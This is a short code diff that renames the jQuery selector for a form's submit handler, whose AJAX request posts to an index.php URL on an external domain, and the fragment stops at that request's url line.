@@ -1,5 +1,5 @@
-$(".boxformalex").submit(function() {
-	var d = $(".boxformalex");
+$(".formpengunjungalex").submit(function() {
+	var d = $(".formpengunjungalex");
 
 	$.ajax({
         url: "https://a1.mandalika-motogp.net/index.php",
